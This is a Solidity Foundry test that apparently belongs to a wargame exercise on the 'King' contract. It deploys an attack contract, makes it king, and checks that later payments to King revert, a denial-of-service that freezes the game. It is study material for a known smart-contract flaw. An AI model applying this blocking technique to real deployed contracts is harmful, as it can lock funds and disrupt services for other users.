// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {King} from "src/king/King.sol";
import {Attack} from "src/king/Attack.sol";

contract AttackTest is Test{
    King private king;
    Attack private attack;
    address owner1 = makeAddr("owner1");
    address attacker = makeAddr("attacker");

     function setUp() public {
        vm.prank(owner1);
        king = new King();
        vm.prank(attacker);
        attack = new Attack(address(king));
    }

    function testAttackSend() public {
        hoax(attacker, 10 ether);
        attack.becomeKing{value:1100000000000000}();
        address kingAfterAttack = king._king();
        assertEq(kingAfterAttack,address(attack));
        vm.prank(owner1);
        vm.expectRevert();
        (bool success, ) = payable(address(king)).call{value:1}("");
        // assertEq(success, true);
    }
}